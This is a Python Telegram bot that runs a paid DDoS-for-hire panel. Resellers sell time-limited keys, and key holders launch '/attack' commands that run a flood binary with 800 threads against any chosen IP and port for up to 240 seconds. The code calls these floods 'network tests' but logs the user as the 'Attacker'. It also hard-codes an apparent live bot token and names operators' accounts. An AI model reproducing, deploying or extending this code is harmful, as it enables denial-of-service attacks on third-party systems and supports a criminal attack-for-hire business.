import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta

# Custom MarkdownV2 escape function
def escape_markdown_v2(text):
    """Escape special characters for Telegram MarkdownV2."""
    special_chars = r'_[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

# Telegram bot token (insert your token here)
bot = telebot.TeleBot('8147615549:AAGwT0ppniPc4UqlgtB-akzN9t0B4djMTAY')

# Admin user IDs with usernames and nicknames
admin_id = {
    "6258297180": {"username": "@Rahul_618", "nickname": "Rahul"},
    "1807014348": {"username": "@sadiq9869", "nickname": "Master Owner Overlord"},
    "1866961136": {"username": "@Rohan2349", "nickname": "Rohan Guru"}
}

# Bot configuration for attack parameters
BOT_CONFIG = {
    'packet_size': 1024,  # Matches Rohan.c MAX_PACKET_SIZE constraint
    'attack_threads': 800  # Matches Rohan.c DEFAULT_NUM_THREADS
}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
attacks = {}  # Track active attacks
data_lock = threading.Lock()  # Lock for thread-safe attack management
bot_start_time = datetime.datetime.now()  # Track bot uptime
global_attack_active = False  # Global flag to track active attack

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file, indent=4)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file, indent=4)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"ROHAN-PK-{random_key.upper()}"  # Use ROHAN-PK- prefix
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    nickname = admin_id[user_id]["nickname"] if user_id in admin_id.keys() else username
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open(LOG_FILE, "a") as file:
        file.write(f"`[{timestamp}] Nickname: {nickname} (Username: {username})`\nTarget: {target}\nPort: {port}\nTime: {time} seconds\nBinary: Rohan\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "❌ *No logs found\\.*"
            else:
                file.truncate(0)
                return "✅ *Logs cleared successfully\\!*"
    except FileNotFoundError:
        return "❌ *No logs found\\.*"

def record_command_logs(user_id, command, target=None, port=None, time=None):
    nickname = admin_id[user_id]["nickname"] if user_id in admin_id.keys() else f"UserID: {user_id}"
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"`[{timestamp}] Nickname: {nickname} | UserID: {user_id} | Command: {command}`"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Load resellers and their balances
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

resellers = load_resellers()

# Admin command to add a reseller
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id.keys():
        bot.reply_to(message, "❌ *Access Denied* \\| Only admins can add resellers\\.", parse_mode='MarkdownV2')
        return

    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "📜 *Usage* \\| `/add_reseller <user_id> <balance>`\n\n💡 *Example* \\| `/add_reseller 123456789 500`", parse_mode='MarkdownV2')
        return

    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "❌ *Error* \\| Invalid balance amount\\.", parse_mode='MarkdownV2')
        return

    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"✅ *Reseller Added* \\|\n\n📋 *Reseller ID* \\| {reseller_id}\n💰 *Balance* \\| {initial_balance} Rs", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, f"❌ *Error* \\| Reseller {reseller_id} already exists\\.", parse_mode='MarkdownV2')

# Reseller command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "📜 *Usage* \\| `/genkey <duration>`\n\n📋 *Available* \\| 1hour, 1day, 7days, 1month\n💡 *Example* \\| `/genkey 1day`", parse_mode='MarkdownV2')
        return

    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "❌ *Error* \\| Invalid duration\\. Available: 1hour, 1day, 7days, 1month", parse_mode='MarkdownV2')
        return

    cost = KEY_COST[duration]

    if user_id in admin_id.keys():
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        response = f"✅ *Key Generated* \\|\n\n🔑 *Key* \\| {key}\n⏳ *Duration* \\| {duration}"
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)
            key = create_random_key()
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()
            response = f"✅ *Key Generated* \\|\n\n🔑 *Key* \\| {key}\n⏳ *Duration* \\| {duration}\n💸 *Cost* \\| {cost} Rs\n💰 *Remaining Balance* \\| {resellers[user_id]} Rs"
        else:
            response = f"❌ *Error* \\| Insufficient balance\\.\n💸 *Required* \\| {cost} Rs\n💰 *Available* \\| {resellers[user_id]} Rs"
    else:
        response = "❌ *Access Denied* \\| Admin or reseller only command\\."

    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Help command with enhanced UI
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id.keys():
        bot.reply_to(message, "🚫 *Access Denied* \\| This command is restricted to admins only\\.", parse_mode='MarkdownV2')
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    bot_controls = types.InlineKeyboardButton("🔧 Bot Controls", callback_data="help_bot_controls")
    power_management = types.InlineKeyboardButton("⚡ Power Management", callback_data="help_power_management")
    markup.add(bot_controls, power_management)

    help_text = (
        "💎 *ULTRA PRO MAX ADMIN PANEL* 💎\n"
        "═══════════════════════════════\n"
        "🔥 *Select a section below to explore commands*:\n"
        "  • 🔧 *Bot Controls*: Start, status, and logs\n"
        "  • ⚡ *Power Management*: Attacks, keys, and resellers\n"
        "\n"
        "💬 *Need help\\? Contact*: @Rohan2349, @sadiq9869"
    )
    bot.reply_to(message, help_text, reply_markup=markup, parse_mode='MarkdownV2')

# Reseller command to check balance
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)

    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"💰 *Balance Check* \\|\n\n📋 *Your Balance* \\| {current_balance} Rs"
    else:
        response = "❌ *Access Denied* \\| Reseller only command\\."

    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Redeem key
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "🔑 *Enter Your Key* \\|\n\n📋 Please send the key to redeem\\:", parse_mode='MarkdownV2')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()

    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, "❌ *Error* \\| You already have active access\\.", parse_mode='MarkdownV2')
                return
            else:
                del users[user_id]
                save_users()

        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)
        else:
            bot.reply_to(message, "❌ *Error* \\| Invalid duration in key\\.", parse_mode='MarkdownV2')
            return

        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"✅ *Access Granted* \\|\n\n⏳ *Expires On* \\| {users[user_id]}", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ *Error* \\| Invalid or expired key\\.", parse_mode='MarkdownV2')

# Show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id.keys():
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file, caption="📜 *Recent Logs* \\| Download to view all activity\\.")
            except FileNotFoundError:
                bot.reply_to(message, "❌ *Error* \\| No logs found\\.", parse_mode='MarkdownV2')
        else:
            bot.reply_to(message, "❌ *Error* \\| No logs found\\.", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ *Access Denied* \\| Admin only command\\.", parse_mode='MarkdownV2')

# Start command with enhanced UI
@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    attack_button = types.InlineKeyboardButton("🚀 Attack", callback_data="attack")
    myinfo_button = types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")
    redeem_button = types.InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem")
    status_button = types.InlineKeyboardButton("📊 Status", callback_data="status")
    help_button = types.InlineKeyboardButton("❓ Help", callback_data="help")
    balance_button = types.InlineKeyboardButton("💰 Balance", callback_data="balance")
    markup.add(attack_button, myinfo_button, redeem_button, status_button, help_button, balance_button)
    welcome_message = (
        "🌟 *WELCOME TO VIP DDOS PANEL* 🌟\n"
        "═══════════════════════════════\n"
        "🔥 *Unleash the Power*:\n"
        "  • 🚀 *Attack*: Launch a network test\n"
        "  • 👤 *My Info*: View your profile\n"
        "  • 🎟️ *Redeem Key*: Activate VIP access\n"
        "  • 📊 *Status*: Check bot stats\n"
        "  • ❓ *Help*: Explore all commands\n"
        "  • 💰 *Balance*: Check reseller funds\n"
        "\n"
        "📲 *Owner*: @Pk_Chopra\n"
        "💬 *Support*: @Rohan2349, @sadiq9869\n"
        "═══════════════════════════════"
    )
    bot.reply_to(message, welcome_message, reply_markup=markup, parse_mode='MarkdownV2')

COOLDOWN_PERIOD = 60  # 60 seconds cooldown

# Inline button handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = str(call.from_user.id)
    
    if call.data == "attack":
        if user_id in users:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > expiration_date:
                bot.answer_callback_query(call.id)
                bot.send_message(call.message.chat.id, "❌ *Error* \\| Your access has expired\\.\n📲 Contact @Rohan2349 or @sadiq9869 to renew\\.", parse_mode='MarkdownV2')
                return

            if user_id in last_attack_time:
                time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
                if time_since_last_attack < COOLDOWN_PERIOD:
                    remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                    bot.answer_callback_query(call.id)
                    bot.send_message(call.message.chat.id, f"⌛ *Cooldown Active* \\| Wait {int(remaining_cooldown)} seconds\\.", parse_mode='MarkdownV2')
                    return

            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, (
                "📋 *Enter Attack Details* \\|\n"
                "═══════════════════════════════\n"
                "🔥 *Format* \\| `/attack [IP] [PORT] [TIME]`\n"
                "📌 *Example* \\| `/attack 127.0.0.1 8000 60`\n"
                "⏳ *Max Duration* \\| 240 seconds"
            ), parse_mode='MarkdownV2')
        else:
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, (
                "⛔️ *Unauthorized Access* \\|\n"
                "═══════════════════════════════\n"
                "📲 *Contact Owner* \\| @Pk_Chopra\n"
                "💬 *Support* \\| @Rohan2349, @sadiq9869"
            ), parse_mode='MarkdownV2')

    elif call.data == "myinfo":
        bot.answer_callback_query(call.id)
        my_info(call.message)

    elif call.data == "redeem":
        bot.answer_callback_query(call.id)
        redeem_key_prompt(call.message)

    elif call.data == "status":
        bot.answer_callback_query(call.id)
        status_command(call.message)

    elif call.data == "help":
        bot.answer_callback_query(call.id)
        help_command(call.message)

    elif call.data == "balance":
        bot.answer_callback_query(call.id)
        check_balance(call.message)

    elif call.data == "help_bot_controls":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, (
            "🔧 *Bot Controls* \\|\n"
            "═══════════════════════════════\n"
            "🔥 *Commands*:\n"
            "  • `/start` \\| Launch the bot\n"
            "  • `/help` \\| Show this guide\n"
            "  • `/status` \\| View bot uptime\n"
            "  • `/logs` \\| View recent logs\n"
            "\n"
            "💬 *Need help\\? Contact*: @Rohan2349, @sadiq9869"
        ), parse_mode='MarkdownV2')

    elif call.data == "help_power_management":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, (
            "⚡ *Power Management* \\|\n"
            "═══════════════════════════════\n"
            "🔥 *Commands*:\n"
            "  • `/attack [IP] [PORT] [TIME]` \\| Launch attack\n"
            "  • `/add_reseller <user_id> <balance>` \\| Add reseller\n"
            "  • `/genkey <duration>` \\| Generate key\n"
            "  • `/users` \\| List users\n"
            "  • `/remove <user_id>` \\| Remove user\n"
            "  • `/resellers` \\| View resellers\n"
            "  • `/addbalance <reseller_id> <amount>` \\| Add balance\n"
            "  • `/remove_reseller <reseller_id>` \\| Remove reseller\n"
            "\n"
            "💬 *Need help\\? Contact*: @Rohan2349, @sadiq9869"
        ), parse_mode='MarkdownV2')

# Attack command handler
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.chat.id)

    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            bot.reply_to(message, (
                "❌ *Error* \\|\n"
                "═══════════════════════════════\n"
                "⚠️ Your access has expired\\.\n"
                "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
            ), parse_mode='MarkdownV2')
            return

        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                bot.reply_to(message, f"⌛ *Cooldown Active* \\|\n\n⏳ *Wait* \\| {int(remaining_cooldown)} seconds", parse_mode='MarkdownV2')
                return

        with data_lock:
            global global_attack_active
            if global_attack_active:
                bot.reply_to(message, (
                    "❌ *Attack Error* \\|\n"
                    "═══════════════════════════════\n"
                    "⚠️ Another attack is in progress\\.\n"
                    "⏳ Please wait for it to complete\\.\n"
                    "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
                ), parse_mode='MarkdownV2')
                return

            if user_id in attacks:
                bot.reply_to(message, (
                    "❌ *Attack Error* \\|\n"
                    "═══════════════════════════════\n"
                    "⚠️ You have an active attack running\\.\n"
                    "⏳ Please wait for it to complete\\.\n"
                    "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
                ), parse_mode='MarkdownV2')
                return

        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, (
                "📋 *Attack Usage* \\|\n"
                "═══════════════════════════════\n"
                "🔥 *Format* \\| `/attack [IP] [PORT] [TIME]`\n"
                "📌 *Example* \\| `/attack 127.0.0.1 8000 60`\n"
                "⏳ *Max Duration* \\| 240 seconds"
            ), parse_mode='MarkdownV2')
            return

        try:
            ip = args[1]
            port = int(args[2])
            duration = int(args[3])
            if duration > 240:
                bot.reply_to(message, (
                    "❌ *Attack Error* \\|\n"
                    "═══════════════════════════════\n"
                    "⚠️ Duration must be less than 240 seconds\\.\n"
                    "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
                ), parse_mode='MarkdownV2')
                return

            # Log the attack
            record_command_logs(user_id, 'attack', ip, port, duration)
            log_command(user_id, ip, port, duration)

            # Simulate loading animation
            loading_msg = bot.reply_to(message, "🚀 *Preparing Attack* \\| ███ 0%...", parse_mode='MarkdownV2')
            time.sleep(1)
            bot.edit_message_text("🚀 *Preparing Attack* \\| ██████ 50%...", chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode='MarkdownV2')
            time.sleep(1)
            bot.edit_message_text("🚀 *Preparing Attack* \\| █████████ 100%...", chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode='MarkdownV2')
            time.sleep(0.5)

            # Send immediate response
            username = message.chat.username or "No username"
            response = (
                "🚀 *Attack Initiated* 🚀\n"
                "═══════════════════════════════\n"
                f"🎯 *Target* \\| {escape_markdown_v2(ip)}:{port}\n"
                f"⏳ *Duration* \\| {duration} seconds\n"
                f"👤 *Attacker* \\| @{escape_markdown_v2(username)}\n"
                "═══════════════════════════════\n"
                "📲 *Powered by* \\| @Rohan2349 & @sadiq9869"
            )
            bot.edit_message_text(response, chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode='MarkdownV2')

            # Run attack in a separate thread
            threading.Thread(target=run_attack, args=(user_id, ip, port, duration, message.chat.id)).start()
            last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            bot.reply_to(message, (
                "❌ *Attack Error* \\|\n"
                "═══════════════════════════════\n"
                "⚠️ Invalid port or duration format\\.\n"
                "📋 *Usage* \\| `/attack [IP] [PORT] [TIME]`\n"
                "📌 *Example* \\| `/attack 127.0.0.1 8000 60`\n"
                "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
            ), parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, (
            "⛔️ *Unauthorized Access* \\|\n"
            "═══════════════════════════════\n"
            "📲 *Contact Owner* \\| @Pk_Chopra\n"
            "💬 *Support* \\| @Rohan2349 or @sadiq9869"
        ), parse_mode='MarkdownV2')

# Execute Rohan binary for attack
def run_attack(user_id, ip, port, duration, chat_id):
    global global_attack_active
    try:
        if not os.path.exists('./Rohan'):
            raise FileNotFoundError("Rohan binary not found")
        
        with data_lock:
            global_attack_active = True  # Set global attack flag
        
        packet_size = BOT_CONFIG['packet_size']  # 1024, aligned with Rohan.c
        process = subprocess.Popen(
            ['./Rohan', ip, str(port), str(duration), str(packet_size)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        with data_lock:
            attacks[user_id] = {'process': process, 'chat_id': chat_id}
        
        stdout, stderr = process.communicate(timeout=duration + 10)
        if process.returncode != 0:
            error_msg = stderr.decode('utf-8', errors='ignore') if stderr else "Unknown error"
            raise subprocess.SubprocessError(f"Attack failed: {error_msg}")
        
        attack_complete_msg = (
            "✅ *Attack Completed* ✅\n"
            "═══════════════════════════════\n"
            f"🎯 *Target* \\| {escape_markdown_v2(ip)}:{port}\n"
            f"⏳ *Duration* \\| {duration} seconds\n"
            "═══════════════════════════════\n"
            "🏆 *Result* \\| Attack executed successfully\\!\n"
            "📲 *Powered by* \\| @Rohan2349 & @sadiq9869"
        )
        bot.send_message(chat_id, attack_complete_msg, parse_mode='MarkdownV2')
    except (FileNotFoundError, subprocess.SubprocessError, subprocess.TimeoutExpired) as e:
        error_msg = (
            "❌ *Attack Error* \\|\n"
            "═══════════════════════════════\n"
            f"⚠️ *Issue* \\| {escape_markdown_v2(str(e))}\n"
            "═══════════════════════════════\n"
            "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
        )
        bot.send_message(chat_id, error_msg, parse_mode='MarkdownV2')
    except Exception as e:
        print(f"Unexpected error in attack: {e}")
        error_msg = (
            "❌ *Attack Error* \\|\n"
            "═══════════════════════════════\n"
            "⚠️ *Issue* \\| Unexpected error occurred\n"
            "═══════════════════════════════\n"
            "📲 *Contact* \\| @Rohan2349 or @sadiq9869"
        )
        bot.send_message(chat_id, error_msg, parse_mode='MarkdownV2')
    finally:
        with data_lock:
            if user_id in attacks:
                del attacks[user_id]
            global_attack_active = False  # Clear global attack flag

# My Info handler
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    if user_id in admin_id.keys():
        role = "Admin"
        nickname = admin_id[user_id]["nickname"]
        key_expiration = "No access"
        balance = "Not Applicable"
        response = (
            "👤 *User Information* \\|\n"
            "═══════════════════════════════\n"
            f"ℹ️ *Username* \\| @{escape_markdown_v2(username)}\n"
            f"🆔 *User ID* \\| {user_id}\n"
            f"🚹 *Role* \\| {role}\n"
            f"👑 *Nickname* \\| {nickname}\n"
            f"⏳ *Expiration* \\| {key_expiration}"
        )
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"
        response = (
            "👤 *User Information* \\|\n"
            "═══════════════════════════════\n"
            f"ℹ️ *Username* \\| @{escape_markdown_v2(username)}\n"
            f"🆔 *User ID* \\| {user_id}\n"
            f"🚹 *Role* \\| {role}\n"
            f"⏳ *Expiration* \\| {key_expiration}\n"
            f"💰 *Balance* \\| {balance} Rs"
        )
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
        balance = "Not Applicable"
        response = (
            "👤 *User Information* \\|\n"
            "═══════════════════════════════\n"
            f"ℹ️ *Username* \\| @{escape_markdown_v2(username)}\n"
            f"🆔 *User ID* \\| {user_id}\n"
            f"🚹 *Role* \\| {role}\n"
            f"⏳ *Expiration* \\| {key_expiration}"
        )
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"
        response = (
            "👤 *User Information* \\|\n"
            "═══════════════════════════════\n"
            f"ℹ️ *Username* \\| @{escape_markdown_v2(username)}\n"
            f"🆔 *User ID* \\| {user_id}\n"
            f"🚹 *Role* \\| {role}\n"
            f"⏳ *Expiration* \\| {key_expiration}"
        )

    bot.reply_to(message, response, parse_mode='MarkdownV2')

# List authorized users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id.keys():
        bot.reply_to(message, "❌ *Access Denied* \\| Admin only command\\.", parse_mode='MarkdownV2')
        return

    if users:
        response = "✅ *Authorized Users* \\|\n═══════════════════════════════\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"👤 *User ID* \\| {user}\n📋 *Username* \\| @{escape_markdown_v2(username)}\n⏳ *Expires* \\| {formatted_expiration}\n\n"
    else:
        response = "❌ *No Authorized Users Found* \\|"

    bot.reply_to(message, response, parse_mode='MarkdownV2')

# Remove user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id.keys():
        bot.reply_to(message, "❌ *Access Denied* \\| Admin only command\\.", parse_mode='MarkdownV2')
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "📜 *Usage* \\| `/remove <User_ID>`\n\n💡 *Example* \\| `/remove 123456789`", parse_mode='MarkdownV2')
        return

    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        bot.reply_to(message, f"✅ *User Removed* \\| {target_user_id}", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, f"❌ *Error* \\| User {target_user_id} not found\\.", parse_mode='MarkdownV2')

# Show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id.keys():
        response = "✅ *Authorized Resellers* \\|\n═══════════════════════════════\n"
        if resellers:
            for reseller_id, balance in resellers.items():
                reseller_info = bot.get_chat(reseller_id)
                reseller_username = reseller_info.username if reseller_info.username else "Unknown"
                response += f"👤 *Username* \\| @{escape_markdown_v2(reseller_username)}\n🆔 *User ID* \\| {reseller_id}\n💰 *Balance* \\| {balance} Rs\n\n"
        else:
            response += "❌ *No resellers found\\.*"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ *Access Denied* \\| Admin only command\\.", parse_mode='MarkdownV2')

# Add balance
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id.keys():
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "📜 *Usage* \\| `/addbalance <reseller_id> <amount>`\n\n💡 *Example* \\| `/addbalance 123456789 500`", parse_mode='MarkdownV2')
            return
        
        reseller_id = command_parts[1]
        try:
            amount = float(command_parts[2])
            if reseller_id not in resellers:
                bot.reply_to(message, "❌ *Error* \\| Reseller ID not found\\.", parse_mode='MarkdownV2')
                return
            resellers[reseller_id] += amount
            save_resellers(resellers)
            bot.reply_to(message, f"✅ *Balance Added* \\|\n\n💸 *Amount* \\| {amount} Rs\n🆔 *Reseller ID* \\| {reseller_id}\n💰 *New Balance* \\| {resellers[reseller_id]} Rs", parse_mode='MarkdownV2')
        except ValueError:
            bot.reply_to(message, "❌ *Error* \\| Invalid amount\\.", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ *Access Denied* \\| Admin only command\\.", parse_mode='MarkdownV2')

# Remove reseller
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id.keys():
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "📜 *Usage* \\| `/remove_reseller <reseller_id>`\n\n💡 *Example* \\| `/remove_reseller 123456789`", parse_mode='MarkdownV2')
            return
        
        reseller_id = command_parts[1]
        if reseller_id not in resellers:
            bot.reply_to(message, "❌ *Error* \\| Reseller ID not found\\.", parse_mode='MarkdownV2')
            return
        
        del resellers[reseller_id]
        save_resellers(resellers)
        bot.reply_to(message, f"✅ *Reseller Removed* \\| {reseller_id}", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "❌ *Access Denied* \\| Admin only command\\.", parse_mode='MarkdownV2')

# Status command
@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    uptime = datetime.datetime.now() - bot_start_time
    days, seconds = uptime.days, uptime.seconds
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    seconds = seconds % 60
    response = (
        "📊 *Bot Status* \\|\n"
        "═══════════════════════════════\n"
        f"🕒 *Uptime* \\| {days}d {hours}h {minutes}m {seconds}s\n"
        f"👥 *Active Users* \\| {len(users)}\n"
        f"🎫 *Available Keys* \\| {len(keys)}\n"
        f"🏦 *Resellers* \\| {len(resellers)}\n"
        f"⚡ *Active Attacks* \\| {len(attacks)}\n"
    )
    if user_id in admin_id.keys():
        response += f"🔧 *Admin* \\| {admin_id[user_id]['nickname']}\n"
    response += "═══════════════════════════════\n📲 *Powered by* \\| @Rohan2349 & @sadiq9869"
    bot.reply_to(message, response, parse_mode='MarkdownV2')

if __name__ == "__main__":
    load_data()
    print("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)